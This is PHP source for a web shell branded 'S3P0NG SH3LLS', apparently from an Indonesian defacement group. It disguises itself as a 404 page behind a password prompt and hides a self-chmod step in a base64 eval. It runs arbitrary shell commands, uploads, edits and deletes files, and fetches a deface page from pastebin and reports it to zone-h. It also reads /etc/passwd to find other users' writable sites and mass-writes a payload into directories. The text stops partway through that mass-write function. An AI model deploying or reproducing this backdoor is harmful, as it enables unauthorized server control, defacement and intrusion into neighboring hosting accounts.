/* Recode By Akira */

session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
function login_shell() {
    ?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
 <?php  
            if (isset($_GET['opet'])) {
            echo"
<style>
            @import url(https://fonts.googleapis.com/css?family=Open+Sans);
.btn { display: inline-block; *display: inline; *zoom: 1; padding: 4px 10px 4px; margin-bottom: 0; font-size: 13px; line-height: 18px; color: #333333; text-align: center;text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75); vertical-align: middle; background-color: #f5f5f5; background-image: -moz-linear-gradient(top, #ffffff, #e6e6e6); background-image: -ms-linear-gradient(top, #ffffff, #e6e6e6); background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#ffffff), to(#e6e6e6)); background-image: -webkit-linear-gradient(top, #ffffff, #e6e6e6); background-image: -o-linear-gradient(top, #ffffff, #e6e6e6); background-image: linear-gradient(top, #ffffff, #e6e6e6); background-repeat: repeat-x; filter: progid:dximagetransform.microsoft.gradient(startColorstr=#ffffff, endColorstr=#e6e6e6, GradientType=0); border-color: #e6e6e6 #e6e6e6 #e6e6e6; border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25); border: 1px solid #e6e6e6; -webkit-border-radius: 4px; -moz-border-radius: 4px; border-radius: 4px; -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); -moz-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05); cursor: pointer; *margin-left: .3em; }
.btn:hover, .btn:active, .btn.active, .btn.disabled, .btn[disabled] { background-color: #e6e6e6; }
.btn-large { padding: 9px 14px; font-size: 15px; line-height: normal; -webkit-border-radius: 5px; -moz-border-radius: 5px; border-radius: 5px; }
.btn:hover { color: #333333; text-decoration: none; background-color: #e6e6e6; background-position: 0 -15px; -webkit-transition: background-position 0.1s linear; -moz-transition: background-position 0.1s linear; -ms-transition: background-position 0.1s linear; -o-transition: background-position 0.1s linear; transition: background-position 0.1s linear; }
.btn-primary, .btn-primary:hover { text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25); color: #ffffff; }
.btn-primary.active { color: rgba(255, 255, 255, 0.75); }
.btn-primary { background-color: #4a77d4; background-image: -moz-linear-gradient(top, #6eb6de, #4a77d4); background-image: -ms-linear-gradient(top, #6eb6de, #4a77d4); background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#6eb6de), to(#4a77d4)); background-image: -webkit-linear-gradient(top, #6eb6de, #4a77d4); background-image: -o-linear-gradient(top, #6eb6de, #4a77d4); background-image: linear-gradient(top, #6eb6de, #4a77d4); background-repeat: repeat-x; filter: progid:dximagetransform.microsoft.gradient(startColorstr=#6eb6de, endColorstr=#4a77d4, GradientType=0);  border: 1px solid #3762bc; text-shadow: 1px 1px 1px rgba(0,0,0,0.4); box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.5); }
.btn-primary:hover, .btn-primary:active, .btn-primary.active, .btn-primary.disabled, .btn-primary[disabled] { filter: none; background-color: #4a77d4; }
.btn-block { width: 100%; display:block; }

* { -webkit-box-sizing:border-box; -moz-box-sizing:border-box; -ms-box-sizing:border-box; -o-box-sizing:border-box; box-sizing:border-box; }

html { width: 30%; height:30%; overflow:hidden; }

body { 
    width: 100%;
    height:100%;
    font-family: 'Open Sans', sans-serif;
    background: darkslateblue;
} 
.opet { 
    position: absolute;
    top: 50%;
    left: 50%;
    margin: -150px 0 0 -150px;
    width:300px;
    height:300px;
}
input { 

    width: 100%; 
    margin-bottom: 10px; 
    background: rgba(0,0,0,0.3);
    border: none;
    outline: none;
    padding: 10px;
    font-size: 13px;
    color: #fff;
    text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
    border: 1px solid rgba(0,0,0,0.3);
    border-radius: 4px;
    box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
    -webkit-transition: box-shadow .5s ease;
    -moz-transition: box-shadow .5s ease;
    -o-transition: box-shadow .5s ease;
    -ms-transition: box-shadow .5s ease;
    transition: box-shadow .5s ease;
}
input:focus { box-shadow: inset 0 -5px 45px rgba(100,100,100,0.4), 0 1px 1px rgba(255,255,255,0.2); }
            </style>
<br><br><br><br><br><br><br><br><br><center><center>
<div class=\"opet\">
        <form method=\"post\"><center>
                <input type=\"password\" name=\"d7netp\" placeholder=\"masukin cok\" autocomplete=\"off\" required/>
                <button type=\"submit\" class=\"btn btn-primary btn-block btn-large\">Login</button>
                </form></div></center>";
            }
exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (empty($d7netp) || (isset($_POST['d7netp']) && (md5($_POST['d7netp']) == $d7netp))) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>1#@!#!123s</title>
    <meta name="author" content="D7net">
    <meta name="viewport" content="Kontol" />
    <meta name="description" content="Error Page">
    <meta property="og:description" content="Error Page">
    <meta property="og:image" content="#">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    <link href="https://fonts.googleapis.com/css2?family=Shadows+Into+Light&display=swap" rel="stylesheet">
</head>
<link href="" rel="stylesheet" type="text/css">
<body bgcolor="#092756" text="#ffffff">
<style>
    @import url('https://fonts.googleapis.com/css?family=Dosis');
    @import url('https://fonts.googleapis.com/css?family=Bungee');
body {
    font-family: "Dosis", cursive;
    text-shadow:0px 0px 1px #757575;
    background-color: darkslateblue;
    background-image: url('https://hw-media-cdn-mingchao.kurogame.com/static/assets/rw1-7a848ef9.png');
    background-size: cover;
    background-repeat: no-repeat;
    background-size: 50%;
    background-position: right top;
}

.directory-listing-table {
  margin: auto;
  background-color: rgb(0 0 0 / 57%);
  padding: .7rem 1rem;
  max-width: 900px;
  width: 100%;
  border-radius: .75rem;
}
.tab-filemanager {
    margin: auto;
    background-color: rgb(0 0 0 / 57%);
    padding: .7rem 1rem;
    border-radius: .75rem;

}
thead tr th {
  font-size: 15px;
  color: #fff;
  padding: 0.25rem;
  background-color: cornflowerblue;
  border-radius: .25rem;
  font-family: 'Roboto', 'Open Sans', sans-serif;
}
tbody td {
  font-size: 12px;
  padding: 0.5rem;
  color: #fff;
  font-weight: 400;
  font-family: 'Roboto', 'Poppins', sans-serif;
}
tbody td a {
    text-decoration: none;
    color: #fff;
}
tbody td:not(:first-child) {
  text-align: center;
}

body::-webkit-scrollbar {
  width: 14px;
}

body::-webkit-scrollbar-track {
  background: #000;
}

body::-webkit-scrollbar-thumb {
  background-color: darkslateblue;
  border: 3px solid #000;
}

#content tr:hover {
    background-color: #8084EC;
    text-shadow:0px 0px 5px #fff;
}

#content .first {
    background-color: #4C53F0;
}

#content .first:hover {
    background-color: #8084EC;
    text-shadow:0px 0px 1px #757575;
}
input { 
    margin-bottom: 4px; 
    background: rgba(0,0,0,0.3);
    border: none;
    outline: none;
    padding: 5px;
    font-size: 15px;
    color: #fff;
    text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
    border: 1px solid rgba(0,0,0,0.3);
    border-radius: 14px;
    box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
    -webkit-transition: box-shadow .5s ease;
    -moz-transition: box-shadow .5s ease;
    -o-transition: box-shadow .5s ease;
    -ms-transition: box-shadow .5s ease;
    transition: box-shadow .5s ease;
}

textarea {
    max-width: 100%;
    max-height: 100%;
    padding-left: 2px;
    resize: none;
    overflow: auto;
    color: #fff;
    text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
    border: 1px solid rgba(0,0,0,0.3);
    border-radius: 4px;
    box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
    -webkit-transition: box-shadow .5s ease;
    -moz-transition: box-shadow .5s ease;
    -o-transition: box-shadow .5s ease;
    -ms-transition: box-shadow .5s ease;
    transition: box-shadow .5s ease;
    background: rgba(0,0,0,0.3);
}
    img {
      border-radius: 50%;
      border: 2px;
    }

textarea::-webkit-scrollbar {
  width: 12px;
}

textarea::-webkit-scrollbar-track {
  background: #000000;
}

textarea::-webkit-scrollbar-thumb {
  background-color: darkslateblue;
  border: 3px solid black;
}

a {
    color: #ffffff;
    text-decoration: none;
}

a:hover {
    color: #757B89;
    text-shadow:0px 0px 1 0px #4A7BEC;
}

input,select,textarea {
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}

.gas {
    background-color: #4C53F0;
    color: #ffffff;
    cursor: pointer;
}

select {
    background-color: transparent;
    color: #ffffff;
}

select:after {
    cursor: pointer;
}

.linka {
    background-color: transparent;
    color: #ffffff;
}

.pencet {
    background-color: rgb(0 0 0 / 57%);
    color: #fff;
    border-color: blanchedalmond;
}

option {
    background-color: #1f1f1f;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
.button {
background-color: #000;
border: 5px solid #000;
color: #fff;
line-height: 20px;

}.button:hover {
background-color: #fff;
border-color: #59b1eb;
color: #59b1eb;
}
    d7net {
      font-size: 19pt;
      font-family: 'Shadows Into Light', cursive;
    }
body, a, a,:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), 
    default;
} 
    a:hover {
    cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
    wait;
}
    button:hover {
    cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
    wait;
}

    select:hover {
    cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
    wait;
    }


</style>
<script>
function setfilename(val)
  {
    filename = val.split('\').pop().split('/').pop();
    //filename = filename.substring(0, filename.lastIndexOf('.'));
    document.getElementById('namanya').value = filename;
  }

async function loadFile(file) {
    let text = await file.text();
    document.getElementById("bepasdata").innerHTML = text;
}
            function jscopy() {
                var jsCopy = document.getElementById("CopyFromTextArea");
                jsCopy.focus();
                jsCopy.select();
                document.execCommand("copy");
            }
</script></td>
    <table class="directory-listing-table"><thead><td width="12%">  
    <img src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTA-rEiEWJXVsCskth0o2Dcuato_yKZaR9QFA&usqp=CAU' align="center" style="width:180px; height:180px;"><font face="Bungee" size="5"><d7net>S3P0NG SH3LLS</d7net><br></td><td>

<?php
@http_response_code(404);
$b4dec="base64_decode";$d7netmode="JG5ldG1vZGUgPSAwNDQ0OwokZmlsZXMxID0gJF9TRVJWRVJbJ1NDUklQVF9 GSUxFTkFNRSddOwpjaG1vZCgkZmlsZXMxLCRuZXRtb2RlKTs="; eval($b4dec($d7netmode));
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disf = "<font color='lime'>AMAN</font>";
} else {
    $disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
    echo "<br><table class='directory-listing-table'><thead><td><center><font face=\"dosis\" size=\"4px\">D7NET &copy; 2017 | <a href='https://www.facebook.com/XaveriousOfficial' target='_blank'>D704T Team</font></center></td></thead></table>";
    exit();
}

function cekdir() {
    if (isset($_GET['path'])) {
        $serlok = $_GET['path'];
    } else {
        $serlok = getcwd();
    }
    if (is_writable($serlok)) {
        return "<font color='lime'>Aman Coy</font>";
    } else {
        return "<font color='red'>KONTOL!</font>";
    }
}

function cekroot() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
        return "<font color='lime'>Aman Coy</font>";
    } else {
        return "<font color='red'>KONTOL!</font>";
    }
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function owner($file) {
    if (function_exists("posix_getpwuid")) {
        $tod = @posix_getpwuid(fileowner($file));
        return "<center>".$tod['name']."</center>";
    } else {
        return "<center>".fileowner($file)."</center>";
    }
}

function cekwrite($serlok) {
    $izin = substr(sprintf('%o', fileperms($serlok)), -4);
    if (is_writable($serlok)) {
        return "<font color=lime>".$izin."</font>";
    } else {
        return "<font color=red>".$izin."</font>";
    }
}

function ekse($coman, $serlok) {
    if (!function_exists("proc_open")) {
        die("proc_open function disabled !");
    } elseif (!function_exists("base64_decode")) {
        die("base64_decode function disabled !");
    }
    $komen = base64_decode(base64_decode(base64_decode($coman)));
    $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
    echo "<textarea rows='25' readonly='' cols='100px'>".htmlspecialchars(stream_get_contents($crottz[1]))."</textarea><br><br>";
}

function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

function cekfile($file) {
     return '<i class="fa fa-file" style="color: #d6d4ce"></i> ';
}

function filedate($file) {
    return date("F d Y g:i:s", filemtime($file));
}

function unzip($file, $serlok) {
    if (!is_readable($file)) {
        red("<table class='directory-listing-table'><thead><td>Cannot Unzip File / Unreadable File !</td></thead></table>");
        die();
    } elseif (strpos(file_get_contents($file), "PK") === false) {
        red("<table class='directory-listing-table'><thead><td>This isn't Zip File !</td></thead></table>");
        die();
    }
    $zip = new ZipArchive;
    $res = $zip -> open($file);
    if ($res == true) {
        $zip -> extractTo($serlok);
        $zip -> close();
        lime("<table class='directory-listing-table'><thead><td>Success Unzip File =>     <font color=orange>".basename($_POST['path'])."</font></td></thead</table>");
    } else {
        red("<table class='directory-listing-table'><thead><td>Failed to Unzip File!!</font></td></thead></table>");
    }
    exit();
}

function lime($text) {
    echo "<center><font color='lime'>".$text."</center></font>";
}

function red($text) {
    echo "<center><font color='red'>".$text."</center></font>";
}

foreach($_POST as $key => $value){
    $_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
    $serlok = $_GET['path'];
    $serlok2 = $_GET['path'];
} else {
    $serlok = getcwd();
    $serlok2 = getcwd();
}

$serlok = str_replace('\','/',$serlok);
$serloks = explode('/',$serlok);
$serlokbos = @scandir($serlok);


echo "";
echo '<table width="86%" border="0" cellpadding="3" cellspacing="1" align="center"><td>';
echo ' &nbsp;<button onclick=location.href="?path='.$serlok.'&cmd=opet" class="pencet" style="width:100px; height:30px;"> Command</button>&nbsp; ';
echo ' &nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&upload=opet">Upload File</button>&nbsp; ';
echo ' &nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&info=opet">Information</button>&nbsp; ';
echo ' &nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&buatfile=opet">New File </button>&nbsp';
echo ' &nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&buatfolder=opet">New Folder </button>&nbsp<br><br>';
echo ' &nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&e-mail=opet">Kirim Pesan</button>&nbsp;';
echo ' &nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&about=opet">About</button>&nbsp;';
echo ' &nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&Changemod=opet">Chmod</button>&nbsp;';
echo ' &nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?path='.$serlok.'&tool=opet">Tools</button>&nbsp;';
echo ' &nbsp;<button class="pencet" style="width:100px; height:30px;" onclick=location.href="?logout"><font color=red>Logout</font></button>&nbsp;</td></table>';

echo "<br>(".cekwrite($serlok).")";
echo '&nbsp;&nbsp;<button class="pencet" style="width:70px; height:30px;" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'"><font color=orange>Home</font></button>&nbsp; ';
echo "<br><img src='https://img.icons8.com/external-vectorslab-flat-vectorslab/2x/external-folder-project-management-and-web-marketing-vectorslab-flat-vectorslab.png' alt='Smiley face' width='20' height='20'> &nbsp;";

foreach($serloks as $id => $lok){
    if($lok == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a></center>';
        continue;
    }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
    echo "$serloks[$i]";
    if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}
echo "</td></thead></table><br>";

    if (isset($_GET['logout'])) {
        session_start();
        session_destroy();
        echo '<br><script>window.location="?";</script>';
    }

if (isset($_GET['viewfile'])) {
    echo "</tr></td></table><br/></center><table class='directory-listing-table'><thead><td><center>Current File : ".$_GET['viewfile'];
    echo '';
    echo "<pre><table width='50%' border='0' cellpadding='3' cellspacing='1' align='center'><td><center><button onclick=location.href='?path=$serlok' class='pencet' style='width:120px; height:25px;'>&#60;BACK&nbsp;</button><br><br><textarea readonly='' cols=120 rows=30   y=''>".htmlspecialchars(file_get_contents($_GET['viewfile']))."</textarea></td></thead></table></pre>";
    author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("<table class=\"directory-listing-table\"><thead><td><center>Failed to delete Directory !</center></td></thead></table>");
        } else {
            lime("<table class=\"directory-listing-table\"><thead><td><center>Delete Directory Success !</center></td></thead></table>");
        }
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("<table class=\"directory-listing-table\"><thead><td><center>Failed to Delete File !</center></td></thead></table>");
        } else {
            lime("<table class=\"directory-listing-table\"><thead><td><center>Delete File <font color=orange>".basename($_POST['path'])."</font> Success !</center></td></thead></table>");
        }
    }
    exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $ren = @rename($_POST['path'], $_POST['newname']);
        if ($ren == true) {
            echo "<table class='directory-listing-table'><thead><td><center><font color=lime>Change Name Success!!</font></center></td></thead></table><br>";
            exit();
        } else {
            echo "<table class='directory-listing-table'><thead><td><center><font color=red>Change Name Failed !</font></center></td></thead></table><br>";
        }
    }
    if (empty($_POST['name'])) {
        $namaawal = $_POST['newname'];
    } else {
        $namawal = $_POST['name'];
    }
    echo "<table class='directory-listing-table'><thead><td>";
    echo ' 
    Name : <font color=orange>' .$namawal. '</font><br><br>
    <form method="post">
    <input type="hidden" name="path" value="'.$serlok.'/'.$namawal.'">
    <input type="hidden" name="pilih" value="gantinama">
    New Name : <input name="newname" type="text" class="pencet" size="50" value="'.$serlok.'/'.$namawal.'" />
    <button type="submit" value="Change" name="gantin" class="pencet" style="width:100px; height:30px;"/>Rename!!</button>
            </form></td></thead></table>'; exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = @file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) {
            lime("<table class=\"directory-listing-table\"><thead><td><center>Edit File Success !</center></td></thead></table><br>");
        } else {
            red("<table class=\"directory-listing-table\"><thead><td><center>Edit File Failed !</center></td></thead></table><br>");
        }
    }
    echo "<center><table class=\"directory-listing-table\"><thead><td><center>".$_POST['path']."<br><br>";
    echo '<form method="post">
    <button type="submit" name="gasedit" class="pencet" style="width:100px; height:30px;">Save</button>&nbsp;&nbsp;
    <button type="button" class="pencet" onclick="jscopy()"style="width:80px; height:30px;">Copy</button><br><br>
    <textarea cols=120 id="CopyFromTextArea" rows=30 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="edit">
    </form><br></td></thead></table>'; exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
    dunlut($_POST['path'], $serlok);
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
    unzip($_POST['path'], $serlok);
} elseif ($_REQUEST['upload'] == "opet") {
    echo "<table class=\"directory-listing-table\" align=\"center\"><thead><td><center>UPLOAD FILE<br> ";
    echo '<center>
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br><form enctype="multipart/form-data" method="post">
<table width="50%" border="0" cellpadding="3" cellspacing="1" align="center"><td><center>
<br>Upload Biasa
<input type="hidden" name="upwkwk" value="aplod"><br>
<input type="file" name="berkas"><br>
<button type="submit" name="berkasnya" value="Upload" class="pencet" style="width:250px; height:35px;">upload!</button><br></td><td><center>
<br>403 Upload File<br>
<input type="file" id="datanya" onchange="setfilename(this.value); loadFile(this.files[0])"/>
<input type="hidden" name="bepasnama" id="namanya">
<textarea style="display: none" id="bepasdata" name="bepasdata"></textarea><br>
<button type="submit" name="bepas" value="Upload" class="pencet" style="width:250px; height:35px;">upload!</button>
</form></td></thead></table>';
if (isset($_POST['upwkwk'])) {
    $filenya = $_FILES['berkas']['name'];
    if ($_POST['dirnya'] == "2") {
            $serlok = $_SERVER['DOCUMENT_ROOT'];
        }
    if (isset($_POST['berkasnya'])) {
        $data = @file_put_contents($serlok."/".$filenya, @file_get_contents($_FILES['berkas']['tmp_name']));
        if (file_exists($serlok."/".$filenya)) {
            echo "File Uploaded ! =>&nbsp;<font color='lime'><i>".$serlok."/".$filenya."</i>&nbsp;</font>";
        } else {
            echo "<font color='red'>Failed to Upload !";
        }
    } elseif (isset($_POST['linknya'])) {
        if (empty($_POST['namalink'])) {
            exit("Filename cannot be empty !");
        }
        if ($_POST['dirnya'] == "2") {
            $serlok = $_SERVER['DOCUMENT_ROOT'];
        }
        $data = @file_put_contents($serlok."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
        if (file_exists($serlok."/".$_POST['namalink'])) {
            echo "File Uploaded ! &nbsp;<font color='lime'><i>".$serlok."/".$_POST['namalink']."</i></font>";
        } else {
            echo "<font coloe='red'>Failed to Upload !";
        }
    } elseif (isset($_POST['bepas'])) {
        $bepasdata = $_POST['bepasdata'];
        $bepasnama = $_POST['bepasnama'];
        if ($bepasdata) {
            echo "string";
        }
        @file_put_contents($serlok."/".$bepasnama, $bepasdata);
        if (file_exists($serlok."/".$bepasnama)) {
            echo "OK =>&nbsp;<font color='lime'><i>".$serlok."/".$bepasnama."</i></font>";
        } else {
            echo "<font coloe='red'>Failed to Upload !</center>";
        }
    }
}
exit();
} elseif ($_GET['about'] == "opet") {
    echo '<table class="directory-listing-table"><thead><td>';
    echo 'Created By <font color=orange>D7net</font> <br>Have fun with this world<br>Appearance <font color=orange>Anon7</font><br><br> Thanks.  ';
    echo '</td></table></thead>';
    exit();
} elseif ($_GET['ngehek'] == "opet") {
    $url="https://" . $_SERVER['SERVER_NAME']."/net.html";
$hh=$_SERVER['DOCUMENT_ROOT']."/net.html";
@file_put_contents($hh ,file_get_contents("https://pastebin.com/raw/fc7EtfMs"));
function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
            return curl_exec($ch);
                  curl_close($ch);
        }
            $zoneh = zoneh($url,"Desktop77N3T");
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "<table class=\"directory-listing-table\"><thead><td>$url [ zone-h => <font color=lime>OK</font> ] <a href=\"/net.html\" target=
                \"_blank\" class=\"button\"> view deface</a></td></thead></table>";
            } else {
                echo "<table class=\"directory-listing-table\"><thead><td>$url [ zone-h => <font color=red>ERROR</font> ] <a href=\"/net.html\" target=
                \"_blank\" class=\"button\"> view deface</a></td></thead></table>";
            }exit();
} elseif ($_GET['lompat'] == "opet") {
    $i = 0;
    echo "<table class=\"directory-listing-table\"><thead><td><center>Jumping server<center><br>    <div class='margin: 5px auto;'>";
    if(preg_match("/hsphere/", $dir)) {
        $urls = explode("
", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace(array("http://","www."), "", strtolower($url));
                $etc = "/etc/passwd";
                $f = fopen($etc,"r");
                while($gets = fgets($f)) {
                    $pecah = explode(":", $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if(is_dir($dir_user) === true) {
                        $url_user = $dir_user."/".$url;
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            }
        if($i == 0) { 
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
            while($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } elseif(preg_match("/vhosts|vhost/", $dir)) {
        preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
        $urls = explode("
", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace("www.", "", $url);
                $web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=lime>R</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            }
        if($i == 0) { 
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
                  bing("ip:$ip");
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<center><font color=red>Can't read /etc/passwd</font></center>");
        while($passwd = fgets($etc)) {
            if($passwd == '' || !$etc) {
                echo "<center><font color=red>Can't read /etc/passwd</font></center>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach($user_jumping[1] as $user_idx_jump) {
                    $user_jumping_dir = "/home/$user_idx_jump/public_html";
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if(function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");    
                            if($domain_jump == '') {
                                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if($user_jumping_url == $user_idx_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) { 
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre></td></thead></table>";
    }
    
    echo "</div>";
    exit();
} elseif ($_GET['mas-file'] == "opet") {
    function sabun_massal($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $serlok = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($serlok, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($serlok, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "$serlok<br>";
